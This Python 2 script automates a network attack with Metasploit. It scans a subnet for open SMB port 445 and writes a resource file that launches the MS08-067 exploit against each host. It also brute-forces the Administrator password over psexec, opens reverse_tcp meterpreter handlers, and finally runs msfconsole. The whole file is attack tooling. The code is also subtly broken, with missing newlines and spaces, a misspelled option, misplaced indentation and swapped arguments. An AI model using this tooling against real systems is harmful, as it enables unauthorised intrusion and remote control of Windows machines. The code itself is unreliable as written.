import os, optparse, sys, nmap

def findTgts(subNet):
	nmScan = nmap.PortScanner()
	nmScan.scan(subNet, 445)
	tgtHosts = []

	for host in nmScan.all_hosts():
		if nmScan[host].has_tcp(445):
			state = nmScan[host]['tcp'][445]['state']

			if state == 'open':
				print '[+] Found Target Host' + host
				tgtHosts.append(host)

	return tgtHosts

def setupHandler(configFile, lhost, lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set PAYLOAD ' + 'windows/meterpreter/reverse_tcp')
	configFile.write('set LPORT ' + lport + '\n')
	configFile.write('set LHOST' + lhost + '\n')
	configFile.write('exploit -z -j')
	configFile.write('setg Disable Paloaad Handler 1\n')

def confickerExploit(configFile, tgtHost, lport, lhost):
	configFile.write('use exploit/windows/ms08_067_netapi')
	configFile.write('set RHOST' + str(tgtHost) + '\n')
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp')

def smbBrute(configFile, tgtHost, passwdFile,port,lhost):
	username = 'Administrator'
	pF = open(passwdFile, 'r')

	for password in pF.readlines():
		password = password.strip('\r').strip('\n')
		configFile.write('use windows/smb/psexec')
		configFile.write('set SMBUser ' + str(username) + '\n')
		configFile.write('set SMBPass ' + str(password) + '\n')
		configFile.write('set RHOST ' + str(tgtHost) + '\n')
		configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp')
		configFile.write('set LPORT ' + str(lport) + '\n')
		configFile.write('set LHOST ' + lhost + '\n')
		configFile.write('exploit -j -z\n')

def main():
	configFile = open('meta.rc', 'w')
	parser = optparse.OptionParser('Usage%prog' + '-H<Remote Host(s)> -l <LHOST> [-p <LPORT>] -F <Password File>')
	parser.add_option('-H', dest='tgtHost', type='string',help='specify the target host(s)')
	parser.add_option('-p', dest='lport', type='string', help='specify the listening port')
	parser.add_option('-l', dest='lhost', type='string', help='specify the listening host')
	parser.add_option('-F',dest='passwdFile', type='string', help='specify the password file')
	
	(options, args) = parser.parse_args()
	if (options.tgtHost == None) | (options.lhost == None):
		print parser.usage
		exit(0)

	lhost = options.lhost
	lport = options.lport
	if lport == None:
		lport = '1337'
		passwdFile = options.passwdFile
		tgtHosts = findTgts(options.tgtHost)
		setupHandler(configFile, lhost, lport)
		for  tgtHost in tgtHosts:
			confickerExploit(configFile, tgtHost, lhost, lport)
			if passwdFile != None:
				smbBrute(configFile, tgtHosts, passwdFile, lhost, lport)
		configFile.close()
		os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
	main()